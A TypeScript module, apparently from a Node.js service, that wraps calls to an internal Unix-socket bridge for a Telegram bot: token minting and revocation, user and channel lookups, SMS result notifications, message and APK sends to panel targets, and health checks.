import http from "node:http";
import { logger } from "../lib/logger";
import { BRIDGE_SECRET, BRIDGE_SOCKET } from "./bridgeConfig";

export type PanelSendTarget = {
  tgUid: number;
  role: string;
  chatId: number;
};

export type PanelSendResult = {
  tgUid?: number;
  role?: string;
  chatId?: number;
  ok: boolean;
  messageId?: number;
  error?: string;
};

export type ResolvedKey = {
  userChatId: number;
  channelChatId: number;
  channelTitle: string;
  category?: string;
};

export type SmsNotifyResult = {
  delivered: boolean;
  messageId: number | null;
  error?: string;
};

const BRIDGE_TIMEOUT = 8_000;
// APK uploads to Telegram can take 30–90 s for large files.
const BRIDGE_APK_TIMEOUT = 120_000;

async function bridgeCall<T>(
  method: "GET" | "POST",
  path: string,
  body?: unknown,
  timeoutMs = BRIDGE_TIMEOUT,
): Promise<T> {
  return new Promise((resolve, reject) => {
    const bodyStr = body != null ? JSON.stringify(body) : undefined;
    const headers: Record<string, string> = {
      "x-internal-secret": BRIDGE_SECRET,
      "Content-Type": "application/json",
    };
    if (bodyStr) {
      headers["Content-Length"] = String(Buffer.byteLength(bodyStr));
    }

    const req = http.request(
      {
        socketPath: BRIDGE_SOCKET,
        path,
        method,
        headers,
        timeout: timeoutMs,
      },
      (res) => {
        const chunks: Buffer[] = [];
        res.on("data", (c: Buffer) => chunks.push(c));
        res.on("end", () => {
          try {
            resolve(JSON.parse(Buffer.concat(chunks).toString()) as T);
          } catch {
            reject(new Error("bridge_parse_error"));
          }
        });
        res.on("error", reject);
      },
    );

    req.on("error", reject);
    req.on("timeout", () => {
      req.destroy(new Error("bridge_timeout"));
    });

    if (bodyStr) req.write(bodyStr);
    req.end();
  });
}

async function safeBridgeCall<T>(
  method: "GET" | "POST",
  path: string,
  body?: unknown,
  fallback?: T,
  timeoutMs = BRIDGE_TIMEOUT,
): Promise<T> {
  try {
    return await bridgeCall<T>(method, path, body, timeoutMs);
  } catch (err: unknown) {
    const msg = err instanceof Error ? err.message : String(err);
    if (!msg.includes("ENOENT") && !msg.includes("ECONNREFUSED")) {
      logger.warn({ err, path }, "pyBridge call failed");
    }
    return fallback as T;
  }
}

export async function mintToken(): Promise<string> {
  const r = await safeBridgeCall<{ token?: string }>(
    "POST",
    "/internal/mint-token",
    {},
  );
  return r?.token ?? "";
}

export async function revokeToken(
  token: string,
): Promise<{ revoked: boolean; disconnectedChatId: number | null }> {
  return await safeBridgeCall(
    "POST",
    "/internal/revoke",
    { token },
    { revoked: false, disconnectedChatId: null },
  );
}

export async function getTokenStatus(token: string): Promise<{
  state: string;
  chatId?: number;
  key?: string;
  channelTitle?: string;
}> {
  return await safeBridgeCall(
    "GET",
    `/internal/token-status?token=${encodeURIComponent(token)}`,
    undefined,
    { state: "unknown" },
  );
}

export async function listConnectedUsers(): Promise<
  Array<{ chatId: number; key: string; channelTitle: string }>
> {
  const r = await safeBridgeCall<{
    users?: Array<{ chatId: number; key: string; channelTitle: string }>;
  }>("GET", "/internal/connected-users", undefined, { users: [] });
  return r?.users ?? [];
}

export async function checkKeyAdminStatus(key: string): Promise<{
  exists: boolean;
  isAdmin: boolean;
  channelTitle?: string;
  error?: string;
}> {
  return await safeBridgeCall(
    "GET",
    `/internal/key-admin-status?key=${encodeURIComponent(key)}`,
    undefined,
    { exists: false, isAdmin: false },
  );
}

export async function findUserByKey(key: string): Promise<ResolvedKey | null> {
  const r = await safeBridgeCall<{ user?: ResolvedKey | null }>(
    "GET",
    `/internal/user-by-key?key=${encodeURIComponent(key)}`,
    undefined,
    { user: null },
  );
  return r?.user ?? null;
}

export async function notifySmsResult(params: {
  userChatId: number;
  ok: boolean;
  to: string;
  simSlot?: number;
  error?: string;
  message?: string;
  deviceNumber?: number;
  deviceId?: string;
  from_number?: string;
}): Promise<SmsNotifyResult> {
  return await safeBridgeCall(
    "POST",
    "/internal/notify-sms-result",
    params,
    { delivered: false, messageId: null, error: "bot_not_connected" },
  );
}

export async function forwardNotification(params: {
  key: string;
  text: string;
  buttons?: Array<Record<string, unknown>>;
}): Promise<{ ok: boolean; messageId?: number; error?: string }> {
  return await safeBridgeCall(
    "POST",
    "/internal/forward-notification",
    params,
    { ok: false, error: "bot_not_connected" },
  );
}

export async function getChat(chatRef: string | number): Promise<{
  id: number;
  type?: string;
  title?: string;
  username: string | null;
  inviteLink: string | null;
} | null> {
  const r = await safeBridgeCall<{
    chat?: {
      id: number;
      type?: string;
      title?: string;
      username: string | null;
      inviteLink: string | null;
    } | null;
  }>("POST", "/internal/get-chat", { ref: chatRef }, { chat: null });
  return r?.chat ?? null;
}

export async function panelSend(params: {
  targets: PanelSendTarget[];
  summary: string;
  detailsFilename?: string;
  detailsText?: string;
}): Promise<PanelSendResult[]> {
  const r = await safeBridgeCall<{ results?: PanelSendResult[] }>(
    "POST",
    "/internal/panel-send",
    {
      targets: params.targets,
      summary: params.summary,
      detailsFilename: params.detailsFilename ?? null,
      detailsText: params.detailsText ?? null,
    },
    { results: [] },
  );
  return r?.results ?? [];
}

export async function accountSend(chatId: number, text: string): Promise<boolean> {
  const r = await safeBridgeCall<{ ok?: boolean }>(
    "POST",
    "/internal/account-send",
    { chatId, text },
    { ok: false },
  );
  return r?.ok === true;
}

export async function panelSendApk(params: {
  targets: PanelSendTarget[];
  apkBase64: string;
  apkFileName: string;
}): Promise<PanelSendResult[]> {
  const r = await safeBridgeCall<{ results?: PanelSendResult[] }>(
    "POST",
    "/internal/panel-send-apk",
    {
      targets: params.targets,
      apkBase64: params.apkBase64,
      apkFileName: params.apkFileName,
    },
    { results: [] },
    BRIDGE_APK_TIMEOUT,
  );
  return r?.results ?? [];
}

export async function panelEditMessage(params: {
  edits: Array<{ chatId: number; messageId: number }>;
  text: string;
}): Promise<Array<{ chatId: number; ok: boolean; error?: string }>> {
  const r = await safeBridgeCall<{
    results?: Array<{ chatId: number; ok: boolean; error?: string }>;
  }>(
    "POST",
    "/internal/panel-edit-message",
    { edits: params.edits, text: params.text },
    { results: [] },
  );
  return r?.results ?? [];
}

export async function getPanelBotUsername(): Promise<string | null> {
  const r = await safeBridgeCall<{ username?: string | null }>(
    "GET",
    "/internal/panel-bot-username",
    undefined,
    { username: null },
  );
  return r?.username ?? null;
}

export async function bridgeHealthy(): Promise<boolean> {
  try {
    const r = await bridgeCall<{ ok?: boolean }>("GET", "/internal/health");
    return r?.ok === true;
  } catch {
    return false;
  }
}
